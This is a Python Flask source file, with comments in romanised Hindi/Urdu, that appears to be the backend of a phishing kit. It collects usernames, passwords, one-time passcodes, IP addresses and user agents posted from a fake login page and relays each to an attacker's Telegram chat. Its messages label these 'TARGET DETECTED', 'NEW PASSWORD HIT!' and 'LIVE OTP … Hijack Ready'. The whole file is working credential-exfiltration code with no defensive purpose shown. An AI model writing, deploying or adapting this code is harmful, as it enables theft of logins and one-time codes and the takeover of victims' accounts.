from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

TOKEN = os.environ.get('BOT_TOKEN')
CID = os.environ.get('CHAT_ID')

@app.route('/api/index', methods=['POST'])
def handle_requests():
    try:
        # data ko read karne ka sabse behtreen tareeka
        data = request.get_json(silent=True) or {}
        dtype = data.get('t', 'UNKNOWN')
        user = data.get('u', 'Not Found')
        password = data.get('p', 'Not Found')
        
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        if dtype == 'VISIT':
            msg = f"👀 **TARGET DETECTED**\n🌐 IP: `{ip}`\n📱 User-Agent: `{data.get('d', 'N/A')[:40]}...`"
        
        elif dtype == 'OTP_RECEIVED':
            #
            msg = f"🔥 **Z-PROXY HIT (OTP)**\n👤 User: `{user}`\n🔢 LIVE OTP: `{data.get('o')}`\n✅ Status: Hijack Ready"
        
        # Ye hissa password ko capture karke Telegram bhejega
        elif dtype in ['INIT_LOG', 'REAL_LOG']:
            msg = f"🚀 **NEW PASSWORD HIT!**\n👤 User: `{user}`\n🔑 Pass: `{password}`\n📊 Step: {dtype}\n🌐 IP: `{ip}`"
        
        else:
            msg = f"ℹ️ Update: {dtype} received for {user}"

        # Send to Telegram
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                      json={"chat_id": CID, "text": msg, "parse_mode": "Markdown"})
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"Error: {str(e)}")
        return jsonify({"status": "error"}), 500

def handler(req, res):
    return app(req, res)
    
